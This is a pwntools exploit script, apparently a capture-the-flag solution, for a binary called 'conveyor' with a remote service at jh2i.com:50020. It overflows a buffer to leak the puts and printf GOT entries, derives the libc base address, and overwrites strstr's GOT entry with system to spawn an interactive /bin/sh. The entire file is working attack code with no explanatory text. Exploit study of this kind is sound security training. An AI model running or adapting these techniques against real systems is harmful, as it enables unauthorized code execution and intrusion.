#!/usr/bin/python3

from pwn import *

# context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']
context.arch = 'amd64'

elf = ELF('conveyor')

if args.REMOTE:
    p = remote('jh2i.com', 50020)
    libc = ELF('libc.so')
else:
    p = process(elf.path)
    libc = elf.libc

    if args.GDB:
        gdb.attach(p, '''
            break * 0x400b12
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'> ', choice)

def add_part(content):
    choose(b'1')
    p.sendlineafter(b': ', content)

def check_safety():
    choose(b'2')

def _exit():
    choose(b'0')

# Resolve free address

add_part(b'/bin/sh\x00')

add_part(b'secure part\x00')

# Leak puts and printf address
## Leak puts address (help to find out libc version)
## remote libc version: libc6_2.27-3ubuntu1_amd64

check_safety()

p.sendlineafter(b'? ', b'n\x00')

padding = b'A' * 120
payload = padding + p64(elf.got.puts)[:-1]

p.sendafter(b': ', payload)

p.recvuntil(b':\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))

log.info(f'puts @ {hex(puts_addr)}')

p.sendlineafter(b'? ', b'y\x00')

## Leak printf address

check_safety()

p.sendlineafter(b'? ', b'n\x00')

padding = b'A' * 120
payload = padding + p64(elf.got.printf)[:-1]

p.sendafter(b': ', payload)

p.recvuntil(b':\n')
printf_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = printf_addr - libc.sym.printf

log.info(f'printf @ {hex(printf_addr)}')
log.info(f'libc @ {hex(libc.address)}')
log.info(f'system @ {hex(libc.sym.system)}')

p.sendlineafter(b'? ', b'y\x00')

# Overwrite strstr address

check_safety()

p.sendlineafter(b'? ', b'n\x00')

padding = b'A' * 120
payload = padding + p64(elf.got.strstr)[:-1]

p.sendafter(b': ', payload)

p.sendlineafter(b'? ', b'n\x00')

p.sendlineafter(b': ', p64(libc.sym.system))

# Execute system('/bin/sh')

add_part(b'/bin/sh\x00')

p.interactive()
